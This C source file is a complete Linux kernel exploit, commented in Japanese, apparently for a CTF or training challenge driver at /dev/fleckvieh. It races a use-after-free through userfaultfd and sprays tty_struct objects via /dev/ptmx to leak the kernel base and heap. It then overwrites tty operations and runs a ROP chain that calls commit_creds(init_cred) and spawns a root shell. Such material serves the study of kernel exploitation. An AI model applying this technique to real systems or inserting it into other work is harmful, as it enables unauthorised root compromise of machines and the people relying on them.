#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#define ofs_tty_ops 0xc3c3c0
#define addr_modprobe_path (kbase + 0xe37ea0)
#define rop_push_rdx_cmp_eax_415B005Ch_pop_rsp_rbp (kbase + 0x09b13a)
#define rop_pop_rdi (kbase + 0x09b0ed)
#define addr_init_cred (kbase + 0xe37480)
#define addr_commit_creds (kbase + 0x072830)
#define addr_kpti_trampoline (kbase + 0x800e26)

#define CMD_ADD 0xf1ec0001
#define CMD_DEL 0xf1ec0002
#define CMD_GET 0xf1ec0003
#define CMD_SET 0xf1ec0004

typedef struct {
  long id;
  size_t size;
  char *data;
} request_t;

unsigned long user_cs, user_ss, user_rsp, user_rflags;

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

cpu_set_t pwn_cpu;
int fd;

int add(char *data, size_t size) {
  request_t req = { .size = size, .data = data };
  int r = ioctl(fd, CMD_ADD, &req);
  if (r == -1) fatal("blob_add");
  return r;
}
int del(int id) {
  request_t req = { .id = id };
  int r = ioctl(fd, CMD_DEL, &req);
  if (r == -1) fatal("blob_del");
  return r;
}
int get(int id, char *data, size_t size) {
  request_t req = { .id = id, .size = size, .data = data };
  int r = ioctl(fd, CMD_GET, &req);
  if (r == -1) fatal("blob_get");
  return r;
}
int set(int id, char *data, size_t size) {
  request_t req = { .id = id, .size = size, .data = data };
  int r =  ioctl(fd, CMD_SET, &req);
  if (r == -1) fatal("blob_set");
  return r;
}

int victim;
int ptmx[0x10];
char *buf;

static void* fault_handler_thread(void *arg) {
  static struct uffd_msg msg;
  struct uffdio_copy copy;
  struct pollfd pollfd;
  long uffd;
  static int fault_cnt = 0;

  /* メインスレッドと同じCPUで動かす */
  if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
    fatal("sched_setaffinity");

  uffd = (long)arg;

  puts("[+] fault_handler_thread: waiting for page fault...");
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  while (poll(&pollfd, 1, -1) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
      fatal("poll");

    /* ページフォルト待機 */
    if (read(uffd, &msg, sizeof(msg)) <= 0) fatal("read(uffd)");
    assert (msg.event == UFFD_EVENT_PAGEFAULT);

    /* 要求されたページとして返すデータを設定 */
    switch (fault_cnt++) {
      case 0:
      case 1: {
        puts("[+] UAF read");
        /* [1-2] [2-2] `blob_get`によるページフォルト */
        // victimを解放
        del(victim);

        // tty_structをスプレーし、victimの場所にかぶせる
        for (int i = 0; i < 0x10; i++) {
          ptmx[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
          if (ptmx[i] == -1) fatal("/dev/ptmx");
        }

        // このページのデータを持つバッファ（copy_to_userで上書きされるので適当）
        copy.src = (unsigned long)buf;
        break;
      }

      case 2: {
        puts("[+] UAF write");
        /* [3-2] `blob_set`によるページフォルト */
        // 偽tty_operationをspray (リークしたkheapにかぶらせる)
        for (int i = 0; i < 0x100; i++) {
          add(buf, 0x400);
        }

        // victimを解放し、tty_structをspray
        del(victim);
        for (int i = 0; i < 0x10; i++) {
          ptmx[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
          if (ptmx[i] == -1) fatal("/dev/ptmx");
        }

        // このページのデータを持つバッファ（copy_from_userで書き込む内容）
        copy.src = (unsigned long)buf;
        break;
      }

      default:
        fatal("Unexpected page fault");
    }

    copy.dst = (unsigned long)msg.arg.pagefault.address;
    copy.len = 0x1000;
    copy.mode = 0;
    copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &copy) == -1) fatal("ioctl(UFFDIO_COPY)");
  }

  return NULL;
}

int register_uffd(void *addr, size_t len) {
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  long uffd;
  pthread_t th;

  /* userfaultfdの作成 */
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  if (uffd == -1) fatal("userfaultfd");

  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    fatal("ioctl(UFFDIO_API)");

  /* ページをuserfaultfdに登録 */
  uffdio_register.range.start = (unsigned long)addr;
  uffdio_register.range.len = len;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    fatal("UFFDIO_REGISTER");

  /* ページフォルトを処理するスレッドを作成 */
  if (pthread_create(&th, NULL, fault_handler_thread, (void*)uffd))
    fatal("pthread_create");

  return 0;
}

int main() {
  save_state();

  /* メインスレッドとuffdハンドラが必ず同じCPUで動くよう設定する */
  CPU_ZERO(&pwn_cpu);
  CPU_SET(0, &pwn_cpu);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
    fatal("sched_setaffinity");

  fd = open("/dev/fleckvieh", O_RDWR);
  if (fd == -1) fatal("/dev/fleckvieh");

  void *page;
  page = mmap(NULL, 0x3000, PROT_READ | PROT_WRITE,
              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (page == MAP_FAILED) fatal("mmap");
  register_uffd(page, 0x3000);

  buf = (char*)malloc(0x1000);

  /* [1-1] UAF Read: tty_structのリーク (KASLR) */
  victim = add(buf, 0x400);
  get(victim, page, 0x20);
  unsigned long kbase = *(unsigned long*)(page + 0x18) - ofs_tty_ops;
  printf("kbase = 0x%016lx\n", kbase);
  for (int i = 0; i < 0x10; i++) close(ptmx[i]);

  /* [2-1] UAF Read: tty_structのリーク (ヒープ) */
  victim = add(buf, 0x400);
  get(victim, page+0x1000, 0x400);
  unsigned long kheap = *(unsigned long*)(page + 0x1038) - 0x38;
  printf("kheap = 0x%016lx\n", kheap);
  for (int i = 0; i < 0x10; i++) close(ptmx[i]);

  /* [3-1] UAF Write: tty_structの書き換え */
  memcpy(buf, page+0x1000, 0x400);
  // 偽tty_struct兼tty_operationsの用意
  unsigned long *tty = (unsigned long*)buf;
  tty[0] = 0x0000000100005401; // magic
  tty[2] = *(unsigned long*)(page + 0x10); // dev
  tty[3] = kheap; // ops
  tty[12] = rop_push_rdx_cmp_eax_415B005Ch_pop_rsp_rbp; // ops->ioctl
  // ROP chainの用意
  unsigned long *chain = (unsigned long*)(buf + 0x100);
  *chain++ = 0xdeadbeef; // pop rbp
  *chain++ = rop_pop_rdi;
  *chain++ = addr_init_cred;
  *chain++ = addr_commit_creds;
  *chain++ = addr_kpti_trampoline;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;
  victim = add(buf, 0x400);
  set(victim, page+0x2000, 0x400);

  /* 書き換えられたtty_structの利用 */
  for (int i = 0; i < 0x10; i++)
    ioctl(ptmx[i], 0, kheap + 0x100);

  getchar();
  return 0;
}
